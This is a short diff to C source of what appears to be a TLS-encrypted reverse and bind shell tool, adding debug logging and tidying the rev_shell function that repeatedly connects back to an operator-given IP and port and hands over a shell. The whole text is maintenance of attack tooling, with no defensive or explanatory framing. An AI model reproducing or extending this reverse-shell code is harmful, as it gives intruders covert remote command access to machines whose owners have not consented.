@@ -67,7 +67,7 @@ static void handle_shell(SSL *ssl) {
     
         int ready = select(maxfd + 1, &readfds, NULL, NULL, NULL);
         if (ready < 0) {
-            perror("select");
+            LOG("select() failed\n");
             break;
         }
     
@@ -125,7 +125,6 @@ void bind_shell(void) {
 }
 
 void rev_shell(char *rev_ip, uint16_t rev_port, unsigned int seconds) {
-    int conn;
     SSL_CTX *ctx;
 
     struct sockaddr_in addr;
@@ -137,7 +136,9 @@ void rev_shell(char *rev_ip, uint16_t rev_port, unsigned int seconds) {
     do {
         sleep(seconds);
         seconds *= 2;
-    } while((conn = connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) != 0);
+    } while((connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) != 0);
+
+    LOG("Connection on %s:%u\n", rev_ip, rev_port);
 
     if (!(ctx = create_context(TLS_method()))) return;
     SSL *ssl = SSL_new(ctx);
@@ -148,7 +149,11 @@ void rev_shell(char *rev_ip, uint16_t rev_port, unsigned int seconds) {
         return;
     }
 
+    LOG("SSL connection established\n");
+
     handle_shell(ssl);
+
+    LOG("Disconnecting SSL connection\n");
 
     SSL_shutdown(ssl);
     SSL_free(ssl);
